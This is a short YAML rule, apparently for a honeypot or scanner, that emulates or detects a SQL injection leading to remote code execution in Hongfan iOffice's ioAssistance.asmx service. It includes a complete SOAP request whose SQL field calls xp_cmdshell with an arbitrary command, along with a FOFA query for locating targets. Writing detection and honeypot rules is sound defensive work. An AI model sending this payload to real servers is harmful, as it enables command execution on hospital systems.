rules/nuclei/http/vulnerabilities/other/hongfan-ioffice-rce.yaml

id: hongfan-ioffice-rce
info:
  name: Hongfan OA ioAssistance.asmx - Remote Code Execution
  author: SleepingBag945
  description: 'There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital
    Edition, which can be exploited by attackers to obtain sensitive database information.

    '
  severity: high
  reference:
  - https://github.com/FridaZhbk/pocscan/blob/main/%E7%BA%A2%E5%B8%86/oa%E7%BA%A2%E5%B8%86ioAssistance.asmx%E6%B3%A8%E5%85%A5RCE.py
  metadata:
    verified: true
    max-request: 2
    fofa-query: app="红帆-ioffice"
  tags: hongfan,oa,sqli
traps:
- request:
    method: POST
    path: /ioffice/prg/set/wss/ioAssistance.asmx
    headers:
      Content-Type: text/xml; charset=utf-8
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
            <sql>exec master.dbo.xp_cmdshell '{{command}}'</sql>
          </GetLoginedEmpNoReadedInf>
        </soap:Body>
      </soap:Envelope>
  response:
    status_code: 200
    headers: {}
    body: 'Windows IProot:.*:0:0:'
